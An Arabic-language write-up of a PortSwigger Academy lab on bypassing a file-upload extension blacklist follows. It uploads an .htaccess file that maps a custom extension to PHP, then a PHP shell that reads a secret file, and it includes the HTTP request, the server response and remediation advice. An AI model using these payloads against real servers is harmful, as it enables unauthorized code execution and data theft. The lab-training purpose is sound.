# Lab 04 — Web Shell Upload via Extension Blacklist Bypass (تجاوز القائمة السوداء برفع .htaccess)

[![التصنيف](https://img.shields.io/badge/الفئة-File%20Upload-indigo)]()
[![النوع](https://img.shields.io/badge/النوع-File%20Upload%20—%20Apache%20Configuration%20Override-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-حرج%20(Critical)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/file-upload)

> هذا الشرح جزء من سلسلة [معامل ثغرات رفع الملفات (File Upload)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 04 — Web Shell Upload via Extension Blacklist Bypass (تجاوز القائمة السوداء برفع .htaccess) |
| **تصنيف الثغرة** | File Upload — Apache Configuration Override |
| **معيار الضعف (CWE)** | CWE-434: Unrestricted Upload of File with Dangerous Type |
| **مستوى الخطورة** | حرج (Critical) |
| **الهدف من اللاب** | رفع ملف .htaccess لتعريف امتداد مخصص لتشغيل PHP (.l33t)، ثم رفع الشل وقراءة السر. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

وضع السيرفر هنا قائمة سوداء صارمة للامتدادات تمنع رفع `.php` أو `.php5` أو أي امتداد تنفيذي معروف.

**فكرة الالتفاف العبقرية عبر خادم Apache:**
يستخدم خادم Apache ملفات ضبط موضعية تسمى `.htaccess`. إذا تم رفع ملف بهذا الاسم داخل أي مجلد، يقوم السيرفر بتطبيق الإعدادات المكتوبة بداخله على ذلك المجلد فوراً!
1. نقوم برفع ملف اسمه `.htaccess` يحتوي على سطر يوجه أباتشي لمعاملة أي ملف بامتداد مخصص (مثل `.l33t`) كمفسر PHP:
   `AddType application/x-httpd-php .l33t`
2. بعد أن يقبل السيرفر ملف الإعدادات، نقوم برفع الشل الخاص بنا باسم: `shell.l33t`!
3. الفلتر يسمح بالامتداد لأنه غير موجود في القائمة السوداء، وخادم أباتشي ينفذه كـ PHP بناءً على ملف `.htaccess`!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يرفع ملف إعدادات خادم موضعية `.htaccess` لإعادة برمجة أنواع الوسائط في أباتشي وتشغيل امتدادات غير محظورة.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
السماح برفع ملفات تبدأ بنقطة (`.htaccess`) وعدم تعطيل ميزة `AllowOverride` في إعدادات أباتشي الرئيسية.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. سجل دخولك بحساب `wiener:peter` وافتح Burp Suite.
2. التقط طلب الرفع وأرسله إلى **Repeater**.
3. الخطوة 1: ارفع ملف `.htaccess`:
- عدل اسم الملف: `filename=".htaccess"`
- عدل Content-Type: `text/plain`
- محتوى الملف:
`AddType application/x-httpd-php .l33t`
- أرسل الطلب وتأكد من نجاح الرفع.
4. الخطوة 2: ارفع ملف الشل بامتدادك الجديد:
- اسم الملف: `filename="shell.l33t"`
- Content-Type: `image/jpeg`
- محتوى الملف: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- أرسل الطلب وتأكد من الرفع.
5. الخطوة 3: افتح الرابط في المتصفح:
`/files/avatars/shell.l33t`
ستجد أن أباتشي نفذ الملف كـ PHP وعرض السر!

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /my-account/avatar HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----

------
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
------
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK

The file avatars/.htaccess has been uploaded.
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تعديل سلوك وإعدادات خادم الويب وتنفيذ شل أوامر بامتدادات عشوائية غير محظورة.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

تعطيل ميزة الـ `.htaccess` على مستوى السيرفر الرئيسي عبر ضبط `AllowOverride None`، وحظر رفع أي ملف يبدأ بنقطة.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — File Upload](https://portswigger.net/web-security/file-upload)
- [OWASP Top 10 — Vulnerabilities](https://owasp.org/)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
